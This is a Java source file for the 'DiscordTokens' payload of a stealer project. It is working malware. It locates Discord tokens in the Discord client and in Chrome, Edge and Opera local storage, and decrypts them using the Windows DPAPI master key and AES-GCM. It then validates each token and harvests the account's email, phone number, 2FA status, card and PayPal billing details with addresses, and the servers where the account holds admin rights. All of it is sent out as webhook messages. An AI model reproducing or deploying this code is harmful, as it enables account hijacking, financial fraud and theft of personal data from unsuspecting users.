package dev.chaarlottte.stealer.payload.impl;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.squareup.okhttp.OkHttpClient;
import com.squareup.okhttp.Request;
import com.sun.jna.platform.win32.Crypt32Util;
import dev.chaarlottte.stealer.payload.Payload;
import dev.chaarlottte.stealer.util.PayloadDelivery;
import dev.chaarlottte.stealer.util.Utilities;
import dev.chaarlottte.stealer.util.WebhookMessage;
import org.json.JSONArray;
import org.json.JSONObject;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.awt.*;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Paths;
import java.util.*;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class DiscordTokens implements Payload {
    @Override
    public void execute() throws Exception {
        OkHttpClient client = new OkHttpClient();

        for(String token : getValidTokens(getDiscordTokens())) {
            String userData = getContentFromURL("https://discordapp.com/api/v6/users/@me", token);
            String paymentMethodString = getContentFromURL("https://discordapp.com/api/v6/users/@me/billing/payment-sources", token);
            String guildsDataString = getContentFromURL("https://discord.com/api/v9/users/@me/guilds?with_counts=true", token);

            JSONObject user = new JSONObject(userData);

            String username = user.getString("username") + "#" + user.getString("discriminator");
            String userId = user.getString("id");
            String email = user.getString("email");
            String phoneNumber = user.getString("phone");
            boolean mfa = user.getBoolean("mfa_enabled");
            String avatar = "https://cdn.discordapp.com/avatars/" + userId + "/" + user.getString("avatar") + ".gif";

            if(client.newCall(new Request.Builder().url(avatar).build()).execute().code() == 200) {
                avatar = "https://cdn.discordapp.com/avatars/" + userId + "/" + user.getString("avatar") + ".gif";
            } else {
                avatar = "https://cdn.discordapp.com/avatars/" + userId + "/" + user.getString("avatar") + ".png";
            }

            String nitro = "None";

            if(user.has("premium_type")) {
                if(user.getInt("premium_type") == 1) {
                    nitro = "Nitro Classic";
                } else {
                    nitro = "Nitro Boost";
                }
            }

            JSONArray billing = new JSONArray(paymentMethodString);

            List<PaymentMethod> paymentMethods = new ArrayList<>();

            for (int i = 0; i < billing.length(); i++) {
                JSONObject method = billing.getJSONObject(i);

                PaymentMethod paymentMethod = new PaymentMethod();

                if(method.getInt("type") == 1) {
                    paymentMethod.type = "Debit/Credit Card";
                    paymentMethod.last4 = method.getString("last_4");
                    paymentMethod.brand = method.getString("brand");
                    paymentMethod.expiry = method.getInt("expires_month") + "/" + method.getInt("expires_year");
                    paymentMethod.name = method.getJSONObject("billing_address").getString("name");
                    paymentMethod.billingLineOne = method.getJSONObject("billing_address").getString("line_1");
                    paymentMethod.city = method.getJSONObject("billing_address").getString("city");
                    paymentMethod.country = method.getJSONObject("billing_address").getString("country");
                    paymentMethod.zip = method.getJSONObject("billing_address").getString("postal_code");

                    try {
                        paymentMethod.billingLineTwo = method.getJSONObject("billing_address").getString("line_2");
                    } catch (Exception ignored) {}

                    try {
                        paymentMethod.state = method.getJSONObject("billing_address").getString("state");
                    } catch (Exception ignored) {}
                    paymentMethods.add(paymentMethod);
                } else if(method.getInt("type") == 2) {
                    paymentMethod.type = "PayPal";
                    paymentMethod.paypalEmail = method.getString("email");
                    paymentMethod.name = method.getJSONObject("billing_address").getString("name");
                    paymentMethod.billingLineOne = method.getJSONObject("billing_address").getString("line_1");
                    paymentMethod.city = method.getJSONObject("billing_address").getString("city");
                    paymentMethod.country = method.getJSONObject("billing_address").getString("country");
                    paymentMethod.zip = method.getJSONObject("billing_address").getString("postal_code");

                    try {
                        paymentMethod.billingLineTwo = method.getJSONObject("billing_address").getString("line_2");
                    } catch (Exception ignored) {}

                    try {
                        paymentMethod.state = method.getJSONObject("billing_address").getString("state");
                    } catch (Exception ignored) {}
                    paymentMethods.add(paymentMethod);
                }
            }

            JSONArray guilds = new JSONArray(guildsDataString);


            List<GuildData> guildsOfInterest = new ArrayList<>();

            for (int i = 0; i < guilds.length(); i++) {
                boolean worthIt = false;
                JSONObject guild = guilds.getJSONObject(i);

                GuildData guildData = new GuildData();

                if(guild.getString("permissions").equals("4398046511103")) {
                    worthIt = true;
                    guildData.admin = true;
                }

                guildData.id = guild.getString("id");

                if(guildData.admin && guild.getInt("approximate_member_count") > 100) {
                    worthIt = true;
                    guildData.owner = username + " (This token owns the server)";
                }

                String invitesApiEndpoint = getContentFromURL("https://discord.com/api/v8/guilds/" + guild.getString("id") + "/invites", token);

                try {
                    JSONArray invites = new JSONArray(invitesApiEndpoint);
                    if(invites.length() > 0) {
                        guildData.invite = "https://discord.gg/" + invites.getJSONObject(0).getString("code");
                    }
                } catch (Exception ignored) {}

                guildData.guildName = guild.getString("name");
                guildData.totalMembers = String.valueOf(guild.getInt("approximate_member_count"));
                guildData.onlineMembers = String.valueOf(guild.getInt("approximate_presence_count"));
                guildData.offlineMembers = String.valueOf(guild.getInt("approximate_member_count") - guild.getInt("approximate_presence_count"));

                if(guild.get("icon") instanceof String) guildData.guildIcon = "https://cdn.discordapp.com/icons/" + guildData.id + "/" + guild.getString("icon") + ".png";

                if(worthIt) {
                    guildsOfInterest.add(guildData);
                }
            }

            List<WebhookMessage> webhooks = new ArrayList<>();

            WebhookMessage.Builder userDataWebhook = new WebhookMessage.Builder("Token logged - " + username);
            userDataWebhook.addField("Token", "```fix\n" + token + "```", false);
            userDataWebhook.addField("Nitro", nitro, true);
            userDataWebhook.addField("User ID", userId, true);
            userDataWebhook.addField("Email", email, true);
            userDataWebhook.addField("Phone Number", phoneNumber, true);
            userDataWebhook.addField("2FA", String.valueOf(mfa), true);
            userDataWebhook.setColor(new Color(245, 169, 184));
            userDataWebhook.setThumbnailUrl(avatar);
            webhooks.add(userDataWebhook.build());

            for(PaymentMethod paymentMethod : paymentMethods) {
                WebhookMessage.Builder userPaymentWebhook = new WebhookMessage.Builder("Payment Method - " + username);
                userPaymentWebhook.addField("Payment Method", paymentMethod.type, true);

                if(paymentMethod.type.equals("PayPal")) {
                    userPaymentWebhook.addField("PayPal Email", paymentMethod.paypalEmail, true);
                    userPaymentWebhook.setColor(new Color(22, 155, 215));
                } else {
                    userPaymentWebhook.addField("Brand", paymentMethod.brand, true);
                    userPaymentWebhook.addField("Last 4 Digits", paymentMethod.last4, true);
                    userPaymentWebhook.addField("Expiry Date", paymentMethod.expiry, true);
                    userPaymentWebhook.setColor(new Color(255, 174, 66));
                }

                userPaymentWebhook.addField("Name", paymentMethod.name, true);
                userPaymentWebhook.addField("Address Line 1", paymentMethod.billingLineOne, true);
                if(!paymentMethod.billingLineTwo.equals("no")) userPaymentWebhook.addField("Address Line 2", paymentMethod.billingLineTwo, true);
                userPaymentWebhook.addField("City", paymentMethod.city, true);
                if(!paymentMethod.state.equals("no")) userPaymentWebhook.addField("State", paymentMethod.state, true);
                userPaymentWebhook.addField("Country", paymentMethod.country, true);
                userPaymentWebhook.addField("Postal Code", paymentMethod.zip, true);
                webhooks.add(userPaymentWebhook.build());
            }

            for(GuildData guildData : guildsOfInterest) {
                WebhookMessage.Builder guildDataWebhook = new WebhookMessage.Builder("Guild Data - " + guildData.guildName + " (" + username + ")");
                guildDataWebhook.addField("Guild ID", guildData.id, true);
                guildDataWebhook.addField("Token has admin perms", String.valueOf(guildData.admin), true);
                guildDataWebhook.addField("Online", "\uD83D\uDFE2 " + guildData.onlineMembers + " Online", true);
                guildDataWebhook.addField("Members", "⚫ " + guildData.totalMembers + " Total Members", true);
                guildDataWebhook.setThumbnailUrl(guildData.guildIcon);
                guildDataWebhook.setColor(new Color(new Random().nextFloat(), new Random().nextFloat(), new Random().nextFloat()));

                webhooks.add(guildDataWebhook.build());
            }

            for(WebhookMessage webhookToSend : webhooks) {
                try {
                    PayloadDelivery.send(webhookToSend);
                    Thread.sleep(1000);
                } catch (Exception ignored) {}
            }

        }
    }

    public List<String> getValidTokens(List<String> tokens) {
        ArrayList<String> validTokens = new ArrayList<>();
        tokens.forEach(token -> {
            try {
                URL url = new URL("https://discordapp.com/api/v6/users/@me");
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                con.addRequestProperty("Content-Type", "application/json");
                con.addRequestProperty("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
                con.addRequestProperty("Authorization", token);
                con.getInputStream().close();
                validTokens.add(token);
            } catch (Exception ignored) { }
        });
        return validTokens;
    }

    public List<String> getDiscordTokens() {
        List<String> tokens = new ArrayList<>();

        try {
            Map<String, String> pathsMap = new HashMap<>();
            pathsMap.put(System.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb", System.getenv("APPDATA") + "\\discord\\Local State");
            pathsMap.put(System.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb", System.getenv("APPDATA") + "\\discordcanary\\Local State");
            pathsMap.put(System.getenv("APPDATA") + "\\Lightcord\\Local Storage\\leveldb", System.getenv("APPDATA") + "\\Lightcord\\Local State");
            pathsMap.put(System.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb\\", System.getenv("APPDATA") + "\\discordptb\\Local State");
            pathsMap.put(System.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb", System.getenv("APPDATA") + "\\discordptb\\Local State");
            pathsMap.put(System.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb", System.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Local State");
            pathsMap.put(System.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb", System.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable\\Local State");
            pathsMap.put(System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb", System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Local State");
            pathsMap.put(System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb", System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Local State");

            for(int i = 1; i <= 5; i++) {
                pathsMap.put(System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Profile " + i + "\\Local Storage\\leveldb\\", System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Local State");
            }

            for(String key : pathsMap.keySet()) {
                //List<String> tokensThatIGrabbed = getToken(key, pathsMap.get(key));
                tokens.addAll(getToken(key, pathsMap.get(key)));
            }
        } catch (Exception exception) {
            exception.printStackTrace();
        }


        return tokens;
    }

    private String getContentFromURL(String link, String token) {
        try {
            URL url = new URL(link);
            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            httpURLConnection.setRequestMethod("GET");
            httpURLConnection.addRequestProperty("Content-Type", "application/json");
            httpURLConnection.addRequestProperty("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
            httpURLConnection.addRequestProperty("Authorization", token);
            httpURLConnection.connect();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) stringBuilder.append(line).append("\n");
            bufferedReader.close();
            return stringBuilder.toString();
        } catch (Exception ignored) {
            return "";
        }
    }

    private List<String> getToken(String leveldb, String localState) throws Exception {
        List<String> tokens = new ArrayList<>();
        if (Files.isDirectory(Paths.get(leveldb), new LinkOption[0])) {
            String discord = "";
            for (File file : Objects.requireNonNull(Paths.get(leveldb).toFile().listFiles())) {
                String textFile;
                if (!file.getName().endsWith(".ldb") && !file.getName().endsWith(".log")) continue;
                FileReader fr = new FileReader(file);
                BufferedReader br = new BufferedReader(fr);
                StringBuilder parsed = new StringBuilder();
                while ((textFile = br.readLine()) != null) {
                    parsed.append(textFile);
                }
                fr.close();
                br.close();
                Pattern pattern = Pattern.compile("(dQw4w9WgXcQ:)([^.*\\\\['(.*)\\\\]$][^\"]*)");
                Matcher matcher = pattern.matcher(parsed.toString());

                Pattern pattern2 = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}");
                Matcher matcher2 = pattern2.matcher(parsed.toString());

                if (matcher.find()) {
                    Utilities.fixCryptographyKeyLength();
                    byte[] dToken = matcher.group().split("dQw4w9WgXcQ:")[1].getBytes();
                    ObjectMapper objectMapper = new ObjectMapper();
                    JsonNode jsonNode = null;
                    try {
                        jsonNode = objectMapper.readTree(Files.readAllBytes(Paths.get(localState)));
                    } catch (IOException e) {
                        throw new IllegalStateException("Failed to load JSON from Chrome Local State file", e);
                    }

                    String encryptedMasterKeyWithPrefixB64 = jsonNode.at("/os_crypt/encrypted_key").asText();
                    byte[] encryptedMasterKeyWithPrefix = Base64.getDecoder().decode(encryptedMasterKeyWithPrefixB64);
                    byte[] encryptedMasterKey = Arrays.copyOfRange(encryptedMasterKeyWithPrefix, 5, encryptedMasterKeyWithPrefix.length);

                    byte[] key = Crypt32Util.cryptUnprotectData(encryptedMasterKey);
                    dToken = Base64.getDecoder().decode(dToken);

                    byte[] nonce = Arrays.copyOfRange(dToken, 3, 15);
                    byte[] ciphertextTag = Arrays.copyOfRange(dToken, 15, dToken.length);

                    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");

                    GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, nonce);
                    SecretKeySpec keySpec = new SecretKeySpec(key, "AES");

                    cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmParameterSpec);
                    byte[] out = cipher.doFinal(ciphertextTag);

                    String token = new String(out, StandardCharsets.UTF_8);
                    tokens.add(token);
                } else if(matcher2.find()){
                    byte[] dToken = matcher2.group().getBytes();
                    String token = new String(dToken, StandardCharsets.UTF_8);
                    tokens.add(token);
                } else continue;
            }
        }

        return tokens;
    }

    private class PaymentMethod {
        public String type;
        public String paypalEmail;
        public String brand, last4, expiry;
        public String name, billingLineOne, billingLineTwo = "no", city, state = "no", country, zip;
    }

    private class GuildData {
        public boolean admin;
        public String invite, guildName, id, owner;
        public String totalMembers, onlineMembers, offlineMembers;
        public String guildIcon = "https://yt3.ggpht.com/ytc/AMLnZu99EohaiHwRF_jqYR-uhpFjBNbVg1VuvmNWTVv_sw=s900-c-k-c0x00ffffff-no-rj";
    }
}
